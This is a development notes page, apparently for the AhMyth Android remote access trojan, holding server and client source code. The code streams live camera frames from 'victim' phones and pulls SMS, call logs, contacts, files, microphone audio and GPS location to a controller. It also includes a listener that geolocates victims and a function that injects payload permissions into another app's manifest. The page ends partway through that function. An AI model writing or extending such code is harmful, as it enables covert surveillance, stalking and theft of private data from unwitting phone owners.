## Code for Live Camera Preview Functionality (Server side + Client Side)
> Responsible for Live Camera Preview in the server's camera Lab Feature
> > Needs to be further updated so the preview frames are constantly being sent by the client and so they're visible on the server end

<details>
    <summary>Live Camera Preview (Server Side + Client Side)</summary>
    <br>

### Server Side
- LabCtrl.js
```js
//-----------------------Camera Controller (camera.html)------------------------
// Camera Controller
app.controller("CamCtrl", function ($scope, $rootScope) {
    var $camCtrl = $scope;
    $camCtrl.isSaveShown = false;
    $camCtrl.isLiveShown = false; // To track live preview state
    var camera = CONSTANTS.orders.camera;

    // Remove socket listener if the camera page is changed or destroyed
    $camCtrl.$on('$destroy', () => {
        socket.removeAllListeners(camera);
    });

    $rootScope.Log("[i] Accessing the Victim's Available Cameras...", CONSTANTS.logStatus.INFO);
    $camCtrl.load = 'loading';
    
    // Request camera list from the server
    socket.emit(CONSTANTS.order, { order: camera, extra: 'camList' });

    // Handle incoming data
    socket.on(camera, (data) => {
        if (data.camList === true) { // Response is the camera list
            $rootScope.Log('[✓] Cameras List Arrived', CONSTANTS.logStatus.SUCCESS);
            $camCtrl.cameras = data.list;
            $camCtrl.load = '';
            $camCtrl.selectedCam = $camCtrl.cameras[0]; // Default to the first camera
            $camCtrl.$apply();
        }

        if (data.image === true) { // Response is a picture
            $rootScope.Log('[✓] Picture Arrived', CONSTANTS.logStatus.SUCCESS);

            // Convert binary to base64
            var uint8Arr = new Uint8Array(data.buffer);
            var binary = '';
            for (var i = 0; i < uint8Arr.length; i++) {
                binary += String.fromCharCode(uint8Arr[i]);
            }
            var base64String = window.btoa(binary);

            $camCtrl.imgUrl = 'data:image/jpeg;base64,' + base64String;
            $camCtrl.isSaveShown = true;
            $camCtrl.isLiveShown = false; // Stop live preview if snapshot is taken
            $camCtrl.$apply();

            // Function to save the photo
            $camCtrl.savePhoto = () => {
                $rootScope.Log('[i] Saving Picture...', CONSTANTS.logStatus.INFO);
                var picPath = path.join(downloadsPath, Date.now() + ".jpg");
                fs.outputFile(picPath, Buffer.from(base64String, "base64"), (err) => {
                    if (!err)
                        $rootScope.Log('[✓] Picture Saved at: ' + picPath, CONSTANTS.logStatus.SUCCESS);
                    else
                        $rootScope.Log('[x] Failed to Save the Snapped Photo to the Local Disk!', CONSTANTS.logStatus.FAIL);
                });
            }
        }
        
        if (data.preview === true) { // Response is a live preview frame
            $rootScope.Log('[✓] Live Preview Frame Arrived', CONSTANTS.logStatus.INFO);

            // Convert binary to base64 for display
            var uint8Arr = new Uint8Array(data.buffer);
            var binary = '';
            for (var i = 0; i < uint8Arr.length; i++) {
                binary += String.fromCharCode(uint8Arr[i]);
            }
            var base64String = window.btoa(binary);

            $camCtrl.imgUrl = 'data:image/png;base64,' + base64String;
            $camCtrl.isSaveShown = false; // Hide save button during live preview
            $camCtrl.$apply();
        }
    });

    // Snap a picture
    $camCtrl.snap = () => {
        $rootScope.Log('[i] Snapping a picture...', CONSTANTS.logStatus.INFO);
        socket.emit(CONSTANTS.order, { order: camera, extra: $camCtrl.selectedCam.id });
    }

    // Start live preview
    $camCtrl.startLivePreview = () => {
        $rootScope.Log('[i] Starting Live Preview...', CONSTANTS.logStatus.INFO);
        socket.emit(CONSTANTS.order, { order: camera, extra: 'startLive' });
        $camCtrl.isLiveShown = true;
    }

    // Stop live preview
    $camCtrl.stopLivePreview = () => {
        $rootScope.Log('[i] Stopping Live Preview...', CONSTANTS.logStatus.INFO);
        socket.emit(CONSTANTS.order, { order: camera, extra: 'stopLive' });
        $camCtrl.isLiveShown = false;
    }
});
```

- camera.html
```html
<div class="ui {{load}} basic segment h100"
    style="overflow-y:auto;overflow-x: auto;white-space:nowrap; height: 348px;">
    <div class="ui grid center aligned border">
        <div class="row h20">
            <div class="sixteen wide column">
                <select class="ui dropdown" ng-options="item.name for item in cameras"
                    ng-model="selectedCam"></select>
                <button class="ui labeled icon black button" ng-click="clearLogs(); snap()"><i
                        class="photo icon"></i> Snap</button>
                <button class="ui labeled icon blue button" ng-click="clearLogs(); startLivePreview()" ng-disabled="isLiveShown"><i
                        class="play icon"></i> Start Live Preview</button>
                <button class="ui labeled icon red button" ng-click="clearLogs(); stopLivePreview()" ng-disabled="!isLiveShown"><i
                        class="stop icon"></i> Stop Live Preview</button>
            </div>
        </div>
        <div class="row h80">
            <div class="sixteen wide column h100">
                <div class="ui image border">

                    <a class="ui red ribbon label" ng-show="isSaveShown"
                        ng-click="clearLogs(); savePhoto()">
                        <i class="save icon"></i> Save
                    </a>

                    <div class="image-container bg2">
                        <img class="imageHolder" src="./assets/img/imageHolder.png" ng-src="{{imgUrl}}">
                    </div>

                </div>
            </div>
        </div>
    </div>
</div>
```

### Client Side
- CameraManager.java
```java
package ahmyth.mine.king.ahmyth;

import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import android.hardware.Camera.Parameters;
import android.util.Log;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import java.io.ByteArrayOutputStream;

public class CameraManager {
    private Context context;
    private Camera camera;

    public CameraManager(Context context) {
        this.context = context;
    }

    public void startUp(int cameraID) {
        try {
            camera = Camera.open(cameraID);
            Parameters parameters = camera.getParameters();
            camera.setParameters(parameters);

            // Use a new SurfaceTexture
            SurfaceTexture surfaceTexture = new SurfaceTexture(0);
            camera.setPreviewTexture(surfaceTexture);
            camera.startPreview();
        } catch (Exception e) {
            Log.e("CameraManager", "Error starting camera preview", e);
        }

        camera.takePicture(null, null, new Camera.PictureCallback() {
            @Override
            public void onPictureTaken(byte[] data, Camera camera) {
                releaseCamera();
                sendPhoto(data);
            }
        });
    }

    public void startLivePreview(int cameraID) {
        try {
            camera = Camera.open(cameraID);
            Parameters parameters = camera.getParameters();
            camera.setParameters(parameters);

            // Use a new SurfaceTexture
            SurfaceTexture surfaceTexture = new SurfaceTexture(0);
            camera.setPreviewTexture(surfaceTexture);
            camera.startPreview();

            camera.setPreviewCallback(new Camera.PreviewCallback() {
                @Override
                public void onPreviewFrame(byte[] data, Camera camera) {
                    Log.d("CameraManager", "Preview frame received");
                    sendPreviewFrame(data);
                }
            });
        } catch (Exception e) {
            Log.e("CameraManager", "Error starting live preview", e);
        }
    }

    public void stopLivePreview() {
        if (camera != null) {
            camera.setPreviewCallback(null);
            camera.stopPreview();
            releaseCamera();
        }
    }

    private void sendPhoto(byte[] data) {
        try {
            Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            bitmap.compress(Bitmap.CompressFormat.JPEG, 20, bos);
            JSONObject object = new JSONObject();
            object.put("image", true);
            object.put("buffer", bos.toByteArray());
            IOSocket.getInstance().getIoSocket().emit("x0000ca", object);
        } catch (JSONException e) {
            Log.e("CameraManager", "Error sending photo", e);
        }
    }

    private void sendPreviewFrame(byte[] data) {
        try {
            JSONObject object = new JSONObject();
            object.put("preview", true);
            object.put("buffer", data);
            IOSocket.getInstance().getIoSocket().emit("x0000ca", object);
        } catch (JSONException e) {
            Log.e("CameraManager", "Error sending preview frame", e);
        }
    }

    private void releaseCamera() {
        if (camera != null) {
            camera.stopPreview();
            camera.release();
            camera = null;
        }
    }

    /* LEAVE THIS ALONE */
    public JSONObject findCameraList() {
        if (!context.getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA_ANY)) {
            return null;
        }

        try {
            JSONObject cameras = new JSONObject();
            JSONArray list = new JSONArray();
            cameras.put("camList",true);

            // Search for available cameras
            int numberOfCameras = Camera.getNumberOfCameras();
            for (int i = 0; i < numberOfCameras; i++) {
                Camera.CameraInfo info = new Camera.CameraInfo();
                Camera.getCameraInfo(i, info);
                if (info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
                    JSONObject jo = new JSONObject();
                    jo.put("name", "Front");
                    jo.put("id", i);
                    list.put(jo);
                }
                else if (info.facing == Camera.CameraInfo.CAMERA_FACING_BACK){
                    JSONObject jo = new JSONObject();
                    jo.put("name", "Back");
                    jo.put("id", i);
                    list.put(jo);
                }
                else {
                    JSONObject jo = new JSONObject();
                    jo.put("name", "Other");
                    jo.put("id", i);
                    list.put(jo);
                }
            }
            cameras.put("list" , list);
            return cameras;
        } catch (JSONException e) {
            e.printStackTrace();
        }
        return null;
    }
}
```

- ConnectionManager.java
```java
package ahmyth.mine.king.ahmyth;

import org.json.JSONException;
import org.json.JSONObject;
import io.socket.emitter.Emitter;

import android.content.Context;
import android.util.Log;
import android.os.Looper;
import android.os.Handler;

import java.lang.reflect.Method;

/**
 * Created by AhMyth on 10/1/16.
 */

public class ConnectionManager {

    public static Context context;
    private static io.socket.client.Socket ioSocket;
    private static FileManager fm = new FileManager();

    public static void startAsync(Context con)
    {
        try {
            ConnectionManager.context = con;
            sendReq();
        }catch (Exception ex){
            startAsync(con);
        }
    }

    public static void startContext() {
        try {
            findContext();
        } catch (Exception ignored) {

        }
    }

    private static void findContext() throws Exception {
        Class<?> activityThreadClass;
        try {
            activityThreadClass = Class.forName("android.app.ActivityThread");
        } catch (ClassNotFoundException e) {
            // No context
            return;
        }

        final Method currentApplication = activityThreadClass.getMethod("currentApplication");
        final Context context = (Context) currentApplication.invoke(null, (Object[]) null);

        if (context == null) {
            // Post to the UI/Main thread and try and retrieve the Context
            final Handler handler = new Handler(Looper.getMainLooper());
            handler.post(new Runnable() {
                public void run() {
                    try {
                        Context context = (Context) currentApplication.invoke(null, (Object[]) null);
                        if (context != null) {
                            startAsync(context);
                        }
                    } catch (Exception ignored) {

                    }
                }
            });
        } else {
            startAsync(context);
        }
    }

    public static void sendReq() {
        try {

            if(ioSocket != null )
                return;

            ioSocket = IOSocket.getInstance().getIoSocket();

            ioSocket.on("ping", new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    ioSocket.emit("pong");
                }
            });

            ioSocket.on("order", new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    try {
                        JSONObject data = (JSONObject) args[0];
                        String order = data.getString("order");
                        Log.e("order",order);
                        switch (order){
                            case "x0000ca":
                                if (data.getString("extra").equals("camList"))
                                    x0000ca(-1);
                                else if (data.getString("extra").equals("1"))
                                    x0000ca(1);
                                else if (data.getString("extra").equals("0"))
                                    x0000ca(0);
                                else if (data.getString("extra").equals("startLive"))
                                    x0000ca(2);
                                else if (data.getString("extra").equals("stopLive"))
                                    x0000ca(3);
                                break;
                            case "x0000fm":
                                if (data.getString("extra").equals("ls"))
                                    x0000fm(0, data.getString("path"));
                                else if (data.getString("extra").equals("dl"))
                                    x0000fm(1, data.getString("path"));
                                break;
                            case "getExternalStoragePath": // case for getting external storage path
                                getExternalStoragePath();
                                break;
                            case "getSDCardPath": // case for SD card path
                                getSDCardPath();
                                break;
                            case "x0000sm":
                                if(data.getString("extra").equals("inbox")) {
                                    x0000sm(0, "inbox", null);
                                } else if(data.getString("extra").equals("outbox")) {
                                    x0000sm(0, "outbox", null);
                                } else if(data.getString("extra").equals("sendSMS")) {
                                    x0000sm(1, data.getString("to"), data.getString("sms"));
                                }
                            case "x0000cl":
                                x0000cl();
                                break;
                            case "x0000cn":
                                x0000cn();
                                break;
                            case "x0000mc":
                                x0000mc(data.getInt("sec"));
                                break;
                            case "x0000lm":
                                x0000lm();
                                break;
                        }
                    }catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            });
            ioSocket.connect();

        }catch (Exception ex){
            Log.e("error" , ex.getMessage());
        }
    }

    public static void x0000ca(int req) {
        CameraManager cameraManager = new CameraManager(context);
        if (req == -1) {
            JSONObject cameraList = cameraManager.findCameraList();
            if (cameraList != null)
                ioSocket.emit("x0000ca", cameraList);
        } else if (req == 1) {
            cameraManager.startUp(1);
        } else if (req == 0) {
            cameraManager.startUp(0);
        } else if (req == 2) { // Request to start live preview
            cameraManager.startLivePreview(0); // Pass the correct camera ID if needed
        } else if (req == 3) { // Request to stop live preview
            cameraManager.stopLivePreview();
        }
    }

    public static void x0000fm(int req, String path) {
        if (req == 0)
            ioSocket.emit("x0000fm", fm.walk(path));
        else if (req == 1)
            fm.downloadFile(path);
    }

    // part of the FileManager Class for dynamic external storage path retrieval and handling
    public static void getExternalStoragePath() {
        String path = fm.getExternalStoragePath();
        JSONObject response = new JSONObject();
        try {
            response.put("path", path);
            ioSocket.emit("getExternalStoragePath", response);
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }

    // part of the FileManager Class for dynamic Sd card path retrieval and handling
    public static void getSDCardPath() {
        String path = fm.getSDCardPath(context);
        JSONObject response = new JSONObject();
        try {
            response.put("path", path);
            ioSocket.emit("getSDCardPath", response);
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }

    public static void x0000sm(int req, String type, String msg) {
        if (req == 0) {
            if ("inbox".equals(type)) {
                ioSocket.emit("x0000sm", SMSManager.getInboxSMSList());
            } else if ("outbox".equals(type)) {
                ioSocket.emit("x0000sm", SMSManager.getSentSMSList());
            }
        } else if (req == 1) {
            boolean isSent = SMSManager.sendSMS(type, msg);
            ioSocket.emit("x0000sm", isSent);
        }
    }

    public static void x0000cl(){
        ioSocket.emit("x0000cl" , CallsManager.getCallsLogs());
    }

    public static void x0000cn(){
        ioSocket.emit("x0000cn" , ContactsManager.getContacts());
    }

    public static void x0000mc(int sec) throws Exception{
        MicManager.startRecording(sec);
    }

    public static void x0000lm() throws Exception{
        Looper.prepare();
        LocManager gps = new LocManager(context);
        JSONObject location = new JSONObject();
        // check if GPS enabled
        if(gps.canGetLocation()){

            double latitude = gps.getLatitude();
            double longitude = gps.getLongitude();
            Log.e("loc" , latitude+"   ,  "+longitude);
            location.put("enable" , true);
            location.put("lat" , latitude);
            location.put("lng" , longitude);
        }
        else
            location.put("enable" , false);
        ioSocket.emit("x0000lm", location);
    }
}
```
</details>
<br>

## Code for Updated `>_ Listen` and `>_ Stop` functions + Client ID association
> Handles IPv4 + IPv6 IP addresses through geoip better + Generates unqiue client hashes and then maps them to unique 4-digit client numbers and then assigns them to client connections.
>> This currently only assigns client ID numbers, it needs to be further updated to allow users to re-connect to specfic clients.
>> This may evem be reworked with some client side ID association which would allow users to connect and reconnect to specifc clients on specific ports

<details>
    <summary>Listen, Stop & Client ID Association Code</summary>
    <br>

- Main Process
```js
const crypto = require('crypto');

let clientIdCounter = 1;
const hashToClientId = {};
const clientIdToHash = {};

initialize();

// Function to generate a unique 4-digit client ID
function generateClientId() {
  // Ensure client IDs are always 4 digits
  return String(clientIdCounter++).padStart(4, '0');
}

// Function to create a hash from victim's information
function generateHash(victimInfo) {
  return crypto.createHash('md5').update(victimInfo).digest('hex');
}

// Function to get a unique 4-digit client ID based on victim's information
function getUniqueClientId(victimInfo) {
  const hash = generateHash(victimInfo);
  if (!hashToClientId[hash]) {
    // If hash does not exist, assign a new client ID
    const clientId = generateClientId();
    hashToClientId[hash] = clientId;
    clientIdToHash[clientId] = hash;
  }
  return hashToClientId[hash];
}

/* existing window code for Splash and Main Screen */

// Function to check if the extracted victim IP is private or public
function isPrivateIP(ip) {
  return /^10\./.test(ip) ||
    /^192\.168\./.test(ip) ||
    /^172\.(1[6-9]|2[0-9]|3[0-1])\./.test(ip);
}

// Global Object to track the listening status for each port
const listeningStatus = {};

// Global object to store client IDs by port
const clientIdsByPort = {};

// function to listen for incoming client connections
ipcMain.on('SocketIO:Listen', function (event, port) {
  if (listeningStatus[port]) {
    event.reply('SocketIO:ListenError', '[x] Already Listening on Port ' + port);
    return;
  }

  /* Initialize the client IDs array for the port 
  the victim connection was received on, if not already initialized. */
  if (!clientIdsByPort[port]) {
    clientIdsByPort[port] = [];
  }

  /* Allows the display of end directory files when using 
  the File Manager Feature in the Victim's Lab as well 
  as downloads from the victim device of upto 50mb */
  IOs[port] = io.listen(port, {
    maxHttpBufferSize: 1024 * 1024 * 100
  });
  IOs[port].sockets.pingInterval = 10000;
  IOs[port].sockets.pingTimeout = 10000;

  // retrieve and handle the connection as well as the victim information
  IOs[port].sockets.on('connection', function (socket) {
    var address = socket.request.connection;
    var query = socket.handshake.query;
    var index = query.id;

    // Extract IP address of the connected victim(s) + handle both IPv4 and IPv6 formats
    var ip = address.remoteAddress;
    if (ip.includes(':')) {
      ip = ip.substring(ip.lastIndexOf(':') + 1);
    }

    /* Set the counry as null for every connection
    before obtaining the country of origin based on the victim's IP 
    to avoid conflictions */
    var country = null;

    // check if the extracted victim IP from an active connection is Private or Public
    if (isPrivateIP(ip)) {

      // If the IP is Private
      const warningMessage = `[!] IP ${ip} is a private IP address! Private IP addresses cannot be Geolocated, skipping GeoIP lookup.`;
      event.reply('SocketIO:GeoIPError', warningMessage);
      event.sender.send('SocketIO:Log', warningMessage);
    } else {

      // if the IP is public 
      // Check the IP location
      var geo = geoip.lookup(ip);

      // handle exceptions
      if (geo) {
        if (geo.country) {
          country = geo.country.toLowerCase();
        } else {
          const warningMessage = `[!] GeoIP lookup returned no country for IP: ${ip}, Unable to determine the Victim's Country.`;
          event.reply('SocketIO:GeoIPError', warningMessage);
          event.sender.send('SocketIO:Log', warningMessage);
        }
      } else {
        const warningMessage = `[!] GeoIP lookup failed for IP: ${ip}, Unable to determine the Victim's Country.`;
        event.reply('SocketIO:GeoIPError', warningMessage);
        event.sender.send('SocketIO:Log', warningMessage);
      }
    }

    /* generate a unique client hash and map it to a 
    4 digit client number based on the victim's IP 
    and the remote address port */
    const victimInfo = `${ip}:${address.remotePort}`;
    const clientId = getUniqueClientId(victimInfo);

    // Store the client ID in the global object
    clientIdsByPort[port].push(clientId);

    victimsList.addVictim(socket, ip, address.remotePort, country, query.manf, query.model, query.release, query.id, clientId);

    /* existing code for notification window */
});

ipcMain.on('SocketIO:Stop', function (event, port) {
  if (IOs[port]) {
    const sockets = IOs[port].sockets.sockets;
    const hasActiveConnections = Object.keys(sockets).length > 0;

    // Set the flag to indicate server-initiated disconnection if there are active connections
    if (hasActiveConnections) {
      IOs[port].sockets.serverInitiatedDisconnection = true;
    }

    IOs[port].close();
    IOs[port] = null;

    if (hasActiveConnections) {
      win.webContents.send('SocketIO:ServerDisconnectionMessage', clientIdsByPort[port]);
    } else {
      event.reply('SocketIO:Stop', '[✓] Stopped Listening on Port: ' + port);
    }

    // Update listening status for the specific port
    listeningStatus[port] = false;

    // Clear the client IDs for the port 
    delete clientIdsByPort[port];
  } else {
    event.reply('SocketIO:StopError', '[x] The Server is not Currently Listening on Port: ' + port);
  }
});
```

- Render Process (AppCtrl)
```js
    /* existing code */

    /* existing code */

    /* existing code */

    /* existing code */

    ipcRenderer.on('SocketIO:ServerDisconnectionMessage', (event, clientIds) => {
        clientIds.forEach(clientId => {
          $appCtrl.Log(`[¡] Server Disconnected from Client: ${clientId}`, CONSTANTS.logStatus.INFO);
        });
        $appCtrl.isListen = false;
        $appCtrl.$apply();
    });

    /* existing code */
```

- Victim Module (Victim.js)
```js
 var Victim = function(socket, ip, port, country, manf, model, release, clientId) {
     this.socket = socket;
     this.ip = ip;
     this.port = port;
     this.country = country;
     this.manf = manf;
     this.model = model;
     this.release = release;
     this.clientId = clientId
 };

 class Victims {
     constructor() {
         this.victimList = {};
         this.instance = this;
     }

     addVictim = (socket, ip, port, country, manf, model, release, id, clientId) => {
        var victim = new Victim(socket, ip, port, country, manf, model, release, clientId);
        this.victimList[id] = victim;
    }
    

     getVictim(id) {
         if (this.victimList[id] != null)
             return this.victimList[id];

         return -1;
     }

     rmVictim(id) {
         delete this.victimList[id];
     }

     getVictimList() {
         return this.victimList;
     }
 }

 module.exports = new Victims();
```

- index.html
```html
            <div class="row h75" style="overflow: scroll;">
                <div class="column">
                    <table class="ui table bg single line selectable">
                        <thead>
                            <tr>
                                <th></th>
                                <th>Client ID</th> <!-- New column for Client ID -->
                                <th>Country</th>
                                <th>Manuf.</th>
                                <th>Model</th>
                                <th>Release</th>
                                <th>IP</th>
                                <th>Port</th>
                                <th></th>
                            </tr>
                        </thead>

                        <tbody>
                            <tr ng-repeat="(key, victim) in victims">
                                <td><a class="ui black ribbon label" ng-click="openLab(key)">Open The Lab</a></td>
                                <td ng-bind="victim.clientId"></td> <!-- Display the Client ID -->
                                <td ng-if="victim.country != null"><i class="{{victim.country}} flag"></i></td>
                                <td ng-if="victim.country == null"><i class="help circle icon"></i></td>
                                <td ng-bind="victim.manf"></td>
                                <td ng-bind="victim.model"></td>
                                <td ng-bind="victim.release"></td>
                                <td ng-bind="victim.ip"></td>
                                <td ng-bind="victim.port"></td>
                            </tr>
                        </tbody>
                    </table>
                </div>
            </div>
```
</details>
<br></br>

## `autoinstall_linux` code.
> - Thank you to [karma0x309](https://github.com/karma0x309) for the neat base layout of this script.
> - Thank you to [A-Unix](https://github.com/A-Unix) for the figlet banner code that gives the installer a stylish banner.
>> - Needs to be updated to install for *DNF (danified yum)* based distros and other RPM based distros if AhMyth supports these distros
>> - Needs to be updated to install for *zyppper* based distros and other openSUSE based distros if AhMyth supports these distros
>> - Needs to be updated to install for *pkg* based distors and other FreeBSD distros if AhMyth supports these distros
>> - Needs to be updated to install for *Portage* based distros and other Gentoo Linux based distros if AhMyth supports these distros
>> - Needs to be updated to install for *apk* based distros and other Alpine Linux based distros if AhMyth supports these distros
<details>
    <Summary>Code</Summary>

```bash
#!/bin/sh

# Create 3D banner for showcase
create_3d_banner() {
    
    # Reset color code
    reset_color="\033[0m"
    
    # Banner color code
    blue="\033[34m"
    
    # Banner text
    banner_text="   AhMyth"

    # Check if figlet and lolcat are installed
    if command -v figlet > /dev/null 2>&1; then
        # Use figlet to create ASCII art with mono9 font
        figlet_output=$(figlet -f mono9 "$banner_text")

        # Use lolcat to add color to the ASCII art
        banner_output=$(echo "$figlet_output")

        # Print the result
        echo "${blue}${banner_output}${reset_color}"
    else
        if [ "$PACKAGE_MANAGER" = "apt-get" ]; then
            apt-get install -y figlet
        elif [ "$PACKAGE_MANAGER" = "pacman" ]; then
            pacman -Sy figlet
            
            # Reset color code
            reset_color="\033[0m"
    
            # Banner color code
            blue="\033[34m"
    
            # Banner text
            banner_text="   AhMyth"
           
            # Use figlet to create ASCII art with mono9 font
            figlet_output=$(figlet -f mono9 "$banner_text")

            # Use lolcat to add color to the ASCII art
            banner_output=$(echo "$figlet_output")

            # Print the result
            echo "${blue}${banner_output}${reset_color}"

        fi
    fi
}

# Get the path to the script's directory
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"

# String color codes
reset_color="\033[0m"
red="\033[31m"
green="\033[32m"
yellow="\033[33m"

# Check package manager
if [ -x "$(command -v apt-get)" ]; then
    PACKAGE_MANAGER="apt-get"
elif [ -x "$(command -v pacman)" ]; then
    PACKAGE_MANAGER="pacman"
else
    echo "${red}[x] Unsupported package manager.\nThis script currently supports APT and Pacman-based systems.${reset_color}"
    exit 1
fi

java_install() {
    echo "${yellow}[i] Installing default JDK...${reset_color}\n"
    if [ "$PACKAGE_MANAGER" = "apt-get" ]; then
        apt-get install -y default-jdk
    elif [ "$PACKAGE_MANAGER" = "pacman" ]; then
        pacman -Sy jdk-openjdk
    fi
    echo "\n${green}[✔] Default JDK has been installed successfully.${reset_color}"
    sleep 2
}

nodejs_install() {
    echo "${yellow}[i] Installing Node.js...${reset_color}\n"
    if [ "$PACKAGE_MANAGER" = "apt-get" ]; then
        apt-get install -y nodejs
    elif [ "$PACKAGE_MANAGER" = "pacman" ]; then
        pacman -Sy nodejs
    fi
    echo "\n${green}[✔] Node.js has been installed successfully.${reset_color}"
    sleep 2
    clear
}

npm_install() {
    echo "${yellow}[i] Installing npm...${reset_color}\n"
    if [ "$PACKAGE_MANAGER" = "apt-get" ]; then
        apt-get install -y npm
    elif [ "$PACKAGE_MANAGER" = "pacman" ]; then
        pacman -Sy npm
    fi
    echo "\n${green}[✔] npm has been installed successfully.${reset_color}"
    sleep 2
    clear
}

git_install() {
    echo "${yellow}[i] Installing Git...${reset_color}\n"
    if [ "$PACKAGE_MANAGER" = "apt-get" ]; then
        apt-get install -y git
    elif [ "$PACKAGE_MANAGER" = "pacman" ]; then
        pacman -Sy git
    fi
    echo "\n${green}[✔] Git has been installed successfully.${reset_color}"
    sleep 2
    clear
}

create_system_shortcut() {
    # Create ahmyth file and grant executable permissions
    echo "${yellow}[i] Creating ahmyth file and granting executable permissions...${reset_color}\n"
    echo '#!/bin/sh' > ahmyth
    echo "if [ \"\$(id -u)\" = \"0\" ]; then" >> ahmyth
    echo "    npx electron \"$SCRIPT_DIR/app\" --no-sandbox start" >> ahmyth
    echo "else" >> ahmyth
    echo "    npm start --prefix \"$SCRIPT_DIR\"" >> ahmyth
    echo "fi" >> ahmyth
    chmod +x ahmyth
    sleep 2
    clear

    # Move ahmyth file to /usr/local/sbin
    echo "${yellow}[i] Moving ahmyth file to /usr/local/sbin...${reset_color}\n"
    if [ -d "/usr/local/sbin" ]; then
        mv ahmyth /usr/local/sbin
        echo "\n${green}[✔] ahmyth file has been moved to /usr/local/sbin."
    else
        echo "${red}[x] /usr/local/sbin directory not found! Unable to move ahmyth file.${reset_color}"
    fi
    sleep 2
    clear
}

# Check if user is root
if [ "$(id -u)" != "0" ]; then
    clear
    echo "${red}[x] This script must be run as root!${reset_color}" >&2
    exit 1
fi

# Run the function
clear
create_3d_banner
sleep 2

# Update and upgrade
clear
echo "${yellow}[i] Updating and Upgrading...${reset_color}\n"
if [ "$PACKAGE_MANAGER" = "apt-get" ]; then
    apt-get update #&& apt-get upgrade -y
elif [ "$PACKAGE_MANAGER" = "pacman" ]; then
    pacman -Syu --noconfirm
fi
echo "\n${green}[✔] Update and Upgrade done.${reset_color}"
sleep 2
clear

# Check if any version of java 8 through 21 is installed
if [ "$PACKAGE_MANAGER" = "apt-get" ]; then
    if [ -z "$(dpkg -l | grep openjdk- | grep -E '8|9|10|11|12|13|14|15|16|17|18|19|20|21')" ]; then
        echo "${red}[x] Java is not installed!${reset_color}\n"
        java_install
    fi
elif [ "$PACKAGE_MANAGER" = "pacman" ]; then
    if ! pacman -Qi jdk-openjdk >/dev/null 2>&1; then
        echo "${red}[x] Java is not installed!${reset_color}\n"
        java_install
    fi
fi

# Check if nodejs is installed
if [ -z "$(command -v node)" ]; then
    echo "${red}[x] Node.js is not installed!${reset_color}\n" >&2
    nodejs_install
fi

# Check if npm is installed
if [ -z "$(command -v npm)" ]; then
    echo "${red}[x] npm is not installed!${reset_color}\n" >&2
    npm_install
fi

# Check if git is installed
if [ -z "$(command -v git)" ]; then
    echo "${red}[x] Git is not installed!${reset_color}\n" >&2
    git_install
fi

# Check if ahmyth system shortcut exists, create it if not
if [ -z "$(command -v ahmyth)" ]; then
    echo "${red}[x] ahmyth system shortcut doesn't exist!${reset_color}\n"
    create_system_shortcut
fi

# Check if all dependencies are installed
if [ -x "$(command -v node)" ] && [ -x "$(command -v npm)" ] && [ -x "$(command -v git)" ] && [ -f "/usr/local/sbin/ahmyth" ]; then
    echo "${green}[✔] All Dependencies are Installed, Exiting.${reset_color}"
    exit 0
fi
```
</details>
<br></br>

## `"modifyManifest"` function.
> Needs to be updated to insert the camera feature permissions in the right place regardless if there are any `<uses-feature />` tags present.
>> This function currently contains a bug that makes a mess of certain Android Manifest files when formatting them after inserting payload permissions, service and receiver, I believe that it may be to do with Manifests that use the `<queries />` tag.
<details>
    <Summary>Code</Summary>

```javascript
    $appCtrl.modifyManifest = (data, callback) => {
        var checkBoxofCamera = document.getElementById("Permissions1");
        var checkBoxofStorage = document.getElementById("Permissions2");
        var checkBoxofMic = document.getElementById("Permissions3");
        var checkBoxofLocation = document.getElementById("Permissions4");
        var checkBoxofContacts = document.getElementById("Permissions5");
        var checkBoxofSms = document.getElementById("Permissions6");
        var checkBoxofCallsLogs = document.getElementById("Permissions7");

        // default permissions for the payload
        const permissions = CONSTANTS.permissions;

        // Create an array to store the selected permissions
        var selectedPermissions = [];

        // Check each checkbox and add the corresponding permission to the selectedPermissions array
        if (checkBoxofCamera.checked) {
            selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions1);
        }
        if (checkBoxofStorage.checked) {
            selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions2);
        }
        if (checkBoxofMic.checked) {
            selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions3);
        }
        if (checkBoxofLocation.checked) {
            selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions4);
        }
        if (checkBoxofContacts.checked) {
            selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions5);
        }
        if (checkBoxofSms.checked) {
            selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions6);
        }
        if (checkBoxofCallsLogs.checked) {
            selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions7);
        }

        // If all checkboxes are checked, set selectedPermissions to default permissions array from CONSTANTS
        if (
            checkBoxofCamera.checked &&
            checkBoxofStorage.checked &&
            checkBoxofMic.checked &&
            checkBoxofLocation.checked &&
            checkBoxofContacts.checked &&
            checkBoxofSms.checked &&
            checkBoxofCallsLogs.checked
        ) {
            selectedPermissions = permissions;
        }

        // If all checkboxes are unchecked, set selectedPermissions to default permissions array from CONSTANTS
        if (
            !checkBoxofCamera.checked &&
            !checkBoxofStorage.checked &&
            !checkBoxofMic.checked &&
            !checkBoxofLocation.checked &&
            !checkBoxofContacts.checked &&
            !checkBoxofSms.checked &&
            !checkBoxofCallsLogs.checked
        ) {
            selectedPermissions = permissions;
        }

        delayedLog('[★] Parsing the Android Manifest XML Data...');

        // Convert data to a string if it's not already a string
        if (typeof data !== 'string') {
            data = data.toString();
        }

        xml2js.parseString(data, {
            explicitArray: false
        }, (err, result) => {
            if (err) {
                const callbackErrors = [
                    '[x] Unable to Parse the Android Manifest XML Data!',
                    '[¡] Error written to "Parsing.log" on ' + CONSTANTS.logStatus.INFO,
                    logPath,
                ];
                writeErrorLog(err, 'Parsing.log');
